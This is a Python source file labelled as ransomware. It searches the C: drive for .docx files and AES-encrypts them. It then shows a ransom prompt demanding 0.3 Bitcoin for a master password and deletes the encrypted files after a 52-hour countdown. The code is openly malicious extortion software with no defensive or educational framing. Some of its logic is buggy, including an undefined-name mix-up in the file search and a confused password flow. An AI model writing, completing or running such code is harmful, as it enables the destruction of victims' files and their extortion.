#Ransomware
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import os 
import platform
import time
from base64 import b64encode, b64decode

def clear_screen():
    system_name = platform.system().lower()
    if system_name == 'windows':
        os.system('cls')  # For Windows
    else:
        os.system('clear')  # For MacOS and Linux



def encrypt_password(password, master_password):
    salt = os.urandom(16)
    key = PBKDF2(master_password.encode(), salt, dkLen=32, count=1000000)
    iv = os.urandom(AES.block_size)
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_password = pad(password.encode(), AES.block_size)
    encrypted_password = cipher.encrypt(padded_password)
    
    return b64encode(salt + iv + encrypted_password).decode()


def decrypt_password(encrypted_password, master_password):
    encrypted_password = b64decode(encrypted_password.encode())
    salt = encrypted_password[:16]
    iv = encrypted_password[16:32]
    encrypted_data = encrypted_password[32:]

    key = PBKDF2(master_password.encode(), salt, dkLen=32, count=1000000)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    return decrypted_data.decode()

def search_files(directory, file_extension=None):
    filepaths=[]#Store filepaths

    



    for dirpath, dirnames, filenames in os.walk(directory):
        for filename in filenames:
            if file_extension is None or any(filename.endswith(ext) for ext in file_extensions):
                filepaths.append(os.path.join(dirpath, filename))
                

    return filepaths


def encrypt_file(file_path, password):
    salt = get_random_bytes(16)
    key = PBKDF2(password, salt, dkLen=32, count=1000000)
    iv = get_random_bytes(AES.block_size)

    cipher = AES.new(key, AES.MODE_CBC, iv)

    with open(file_path, 'rb') as f:
        data = f.read()

    padded_data = pad(data, AES.block_size)

    encrypted_data = cipher.encrypt(padded_data)

    encrypted_file_path = file_path + ".enc"
    with open(encrypted_file_path, 'wb') as f:
        f.write(salt + iv + encrypted_data)  

    print(f"Encrypted {file_path} -> {encrypted_file_path}")
    
def decrypt_file(file_path, password):
    with open(file_path, 'rb') as f:
        salt = f.read(16)
        iv = f.read(16)
        encrypted_data = f.read()
    
    key = PBKDF2(password, salt, dkLen=32, count=1000000)

    cipher = AES.new(key, AES.MODE_CBC, iv)

    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    decrypted_file_path = file_path.replace(".enc", "_decrypted")
    with open(decrypted_file_path, 'wb') as f:
        f.write(decrypted_data)

    print(f"Decrypted {file_path} -> {decrypted_file_path}")

def main(directory, file_extensions, password,countdown_hours=52 ):

    countdown_time = countdown_hours * 3600
    start_time = time.time()

    files_to_encrypt = search_files(directory, file_extensions)

    for file_path in files_to_encrypt:
        encrypt_file(file_path, password)

    while True:
        elapsed_time = time.time() - start_time

        if elapsed_time >= countdown_time:
            print(f"Time is up! Deleting all encrypted files...")
            encrypted_files = search_files(directory, ['.enc'])
            for file_path in encrypted_files:
                try:
                    os.remove(file_path)
                    print(f"Deleted: {file_path}")
                except Exception as e:
                    print(f"Error deleting {file_path}: {e}")
            break
       
    
        remaining_time=countdown_time - elapsed_time
        hours_left = remaining_time // 3600
        minutes_left = (remaining_time % 3600) // 60
        seconds_left = remaining_time % 60
        print(f"Time remaining: {int(hours_left)}h {int(minutes_left)}m {int(seconds_left)}s")

        clear_screen()

        master_password = input("Youre Files have been encrypted, send 0,3 Bitcoin to this Adress and get the Master password. Enter the master password: ")

        try:
            password = decrypt_password(encrypted_password, master_password)
            print(f"Using decrypted password: {password}")
        except Exception as e:
            print(f"Failed to decrypt password: {e}")
            time.sleep(5)
        


if __name__ == "__main__":
    directory_to_search ='C:\\'
    file_extensions=['docx']

    encrypted_password = "eH/lHU7Cbg8OzDJ9y1tbhfVc2V1q7kshyNhd3pjXy3CNRni9amN4EcfTJUwctjh2YxNOAPDAO1jinj3dZCDnpPK4DAVjhUs2aHigcNVI0eE="
    main(directory_to_search, file_extensions, encrypted_password)
    master_passwort="1234"
